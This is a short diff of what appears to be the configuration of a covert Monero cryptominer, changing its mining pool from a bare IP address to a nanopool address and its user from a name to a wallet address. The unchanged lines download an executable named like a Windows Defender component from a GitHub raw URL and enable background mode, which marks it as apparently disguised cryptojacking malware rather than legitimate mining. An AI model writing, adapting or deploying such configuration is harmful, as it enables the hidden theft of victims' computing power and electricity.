@@ -1,7 +1,7 @@
 <xmrdownloadurl>https://raw.githubusercontent.com/ruexp/fosa/master/MSASCuiL.exe</xmrdownloadurl>
 <algo>rx/0</algo>
-<pool>stratum+tcp://62.109.19.55:3333</pool>
-<user>stelsminer</user>
+<pool>stratum+tcp://xmr-eu1.nanopool.org:14433</pool>
+<user>4AFSH1vGagRgPZPU2qGtcKgE2hmPnRKfmg2qn8QjV8TB6JEiderU55dKugkVbHufPfaPe3PzuJVMaCMwP7B8hgYQGfe2QsY.RandomX/test@test.com</user>
 <password>x</password>
 <backgroundmod>true</backgroundmod>
 <softwareversion>1.1</softwareversion>
